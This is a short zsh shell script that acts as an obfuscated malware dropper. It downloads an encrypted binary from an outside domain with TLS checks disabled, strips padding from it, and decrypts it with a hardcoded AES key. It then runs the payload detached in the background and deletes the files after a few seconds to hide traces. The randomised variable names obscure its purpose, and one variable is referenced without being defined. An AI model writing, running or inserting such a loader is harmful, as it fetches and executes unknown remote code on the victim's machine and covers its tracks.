#!/bin/zsh
bqujg=$(mktemp /tmp/kgmpgh.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m149a70a68654f036.bin" -o "$bqujgz" || exit 1
aqqpbw=$(stat -f %z "$bqujgz"); g5y6jge=$(( aqqpbw - 3561 - 1536 ))
tail -c +$(( 3561 + 1 )) "$bqujgz" | head -c $g5y6jge | openssl enc -d -aes-256-cbc -k cfeb011bed5233ff2f438d6d -out "$bqujg" 2>/dev/null
[ -s "$bqujg" ] && chmod 700 "$bqujg" && ( "$bqujg" & ) && disown
( sleep 3; rm -f "$bqujg" "$bqujgz" ) &>/dev/null &
